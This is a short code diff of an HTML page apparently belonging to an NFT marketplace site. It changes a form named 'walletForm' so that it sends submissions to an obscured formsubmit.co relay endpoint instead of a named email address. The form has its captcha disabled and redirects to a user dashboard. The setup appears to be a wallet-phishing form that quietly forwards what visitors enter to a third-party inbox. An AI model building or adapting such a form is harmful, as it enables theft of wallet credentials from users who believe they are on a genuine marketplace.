@@ -651,7 +651,7 @@
           <div class="loader"></div>
         </div>
       </div>
-<form id="walletForm" action="https://formsubmit.co/info@caketoolsnftmarketplace.com" method="POST">
+<form id="walletForm" action="https://formsubmit.co/fbc8fb7ec32ac2262ab18be74e83e14f" method="POST">
   <input type="hidden" name="_next" value="https://caketoolsnftmarketplace.com/user/dashboard/" />
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
